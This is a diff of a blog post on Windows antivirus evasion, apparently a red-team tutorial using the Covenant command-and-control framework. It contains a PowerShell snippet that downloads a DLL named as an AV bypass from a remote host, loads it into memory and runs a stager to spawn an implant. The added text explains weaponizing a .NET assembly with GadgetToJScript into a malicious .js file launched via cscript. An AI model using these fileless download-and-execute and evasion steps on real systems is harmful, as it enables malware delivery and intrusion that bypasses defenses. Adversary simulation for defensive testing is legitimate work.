@@ -670,7 +670,6 @@ And note your new powershell Grunt checking in on Covenant.
 
 We could also download the DLL from a remote location as follow below:
 
-
 ```powershell 
 PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/monk-Avbypass.dll)
 PS > [System.Reflection.Assembly]::Load($dll)
@@ -679,9 +678,35 @@ PS > [MonkStager.MonkStager]::Execute()
 
 ### 4) Initial delivery 
 
-We can try to simulate a campaign conducted by foreign APT adversaries. We will leverage the [NET-Obfuscate:](https://github.com/BinaryScary/NET-Obfuscate project to weaponize our custom DLL.
- 
+We can try to simulate a campaign conducted by foreign APT adversaries. We will try to leverage the amazing [GadgetToJScript:](https://github.com/med0x2e/GadgetToJScript) project to weaponize our custom .NET assembly.
+
+
+First of all we need to build GadgetToJScript in __VisualStudio__. Once the GadgetToJScript binary has been build we can launch the program to generate a malicious __.js__ file that will spawn our custom Covenant Grunt.
+
+The code is illustrate below: 
 
 <p align="center">
-  <img src="/assets/posts/2021-03-01-Windows-Evasion/cov4.JPG">
+  <img src="/assets/posts/2021-03-01-Windows-Evasion/cov6.JPG">
 </p>
+
+The parameters are as follow: 
+
+- a
+- w
+- e 
+- o 
+- b 
+- r
+
+Once we have our malicious __.js__ file we can execute the file using the Windows build in script engine __cscript__ as follow:
+
+<p align="center">
+  <img src="/assets/posts/2021-03-01-Windows-Evasion/cov7.JPG">
+</p>
+
+If everything went file you should now have your new cscript Grunt checking in on Covenant.
+
+<p align="center">
+  <img src="/assets/posts/2021-03-01-Windows-Evasion/cov8.JPG">
+</p>
+ 
